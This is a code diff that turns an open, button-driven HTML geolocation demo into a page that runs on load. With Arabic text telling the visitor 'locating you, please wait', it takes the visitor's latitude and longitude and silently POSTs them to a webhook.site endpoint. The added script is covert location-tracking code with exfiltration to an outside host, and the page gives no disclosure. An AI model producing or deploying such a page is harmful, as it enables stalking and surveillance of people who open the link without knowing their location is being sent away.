@@ -1,27 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Track Location</title>
+  <title>جارٍ تحديد موقعك</title>
 </head>
 <body>
-  <h1>Location Tracker</h1>
-  <button onclick="getLocation()">Get Location</button>
-  <p id="demo"></p>
+  <h1>جارٍ تحديد موقعك...</h1>
+  <p id="status">يرجى الانتظار...</p>
 
   <script>
+    function sendLocation(lat, lon) {
+      fetch("https://webhook.site/de39dc52-95ab-4c25-aba0-e1738a10f980", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon
+        })
+      });
+    }
+
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          document.getElementById("status").innerHTML = "تم تحديد الموقع.";
+          sendLocation(lat, lon);
+        }, function(error) {
+          document.getElementById("status").innerHTML = "خطأ: " + error.message;
+        });
       } else {
-        document.getElementById("demo").innerHTML = "Geolocation is not supported.";
+        document.getElementById("status").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
       }
     }
 
-    function showPosition(position) {
-      document.getElementById("demo").innerHTML =
-      "Latitude: " + position.coords.latitude +
-      "<br>Longitude: " + position.coords.longitude;
-    }
+    getLocation(); // يبدأ تلقائياً عند فتح الصفحة
   </script>
 </body>
 </html>
